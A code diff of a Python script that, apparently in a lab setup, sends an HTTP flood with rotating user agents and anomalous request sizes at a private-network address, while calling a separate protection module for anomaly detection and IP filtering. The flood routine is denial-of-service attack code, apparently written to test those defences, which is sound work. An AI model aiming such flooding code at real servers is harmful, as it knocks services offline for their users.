@@ -6,8 +6,8 @@ import os
 import protection_script  # Import protection mechanisms from protection_script.py
 
 # Target URL for HTTP flood
-target_url = "http://10.0.2.15/real-estate-html-template/index.html"
-num_of_requests = 100
+# target_url = "http://10.0.2.15/real-estate-html-template/index.html"
+# num_of_requests = 100
 
 # Define the log file path
 LOG_FILE = os.path.join(os.getcwd(), "networkinfo.log")
@@ -26,6 +26,7 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
 ]
 
+
 def http_flood(target_url, num_of_requests):
     # Flood the webpage with requests
     for i in range(num_of_requests):
@@ -37,12 +38,12 @@ def http_flood(target_url, num_of_requests):
             request_size = random.randint(100, 300)  # Random size between 100 and 300 bytes
 
             # Introduce anomaly every 10th request
-            if i % 10 == 0:
+            if (i + 1) % 10 == 0:
                 request_size = random.randint(4000, 7000)  # Anomalous size
 
             # Check for anomaly
             if protection_script.anomaly_detector.check_anomaly(request_size):
-                print(f"Anomaly detected at request {i} with size {request_size} bytes")
+                print(f"Anomaly detected at request {i+1} with size {request_size} bytes")
 
             # Filter suspicious IP addresses
             if not protection_script.ip_filtering(protection_script.vm_ip, block_for_testing=False):
@@ -55,12 +56,15 @@ def http_flood(target_url, num_of_requests):
                 # Only print the request status if it was successful (status code 200)
                 if send_request.status_code == 200:
                     print(f"Request status: {send_request.status_code}, Size: {request_size} bytes")
-                else:
-                    print(f"Attack request from {protection_script.vm_ip} blocked.")
         except Exception as e:
             print(f"Error: {str(e)}")
 
+
 if __name__ == "__main__":
+    # Target URL for HTTP flood
+    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
+    num_of_requests = 100
+
     print(f"Starting HTTP flood, targeting {target_url}")
     protection_script.first_check()
     threading.Thread(target=protection_script.connection_tracking, daemon=True).start()
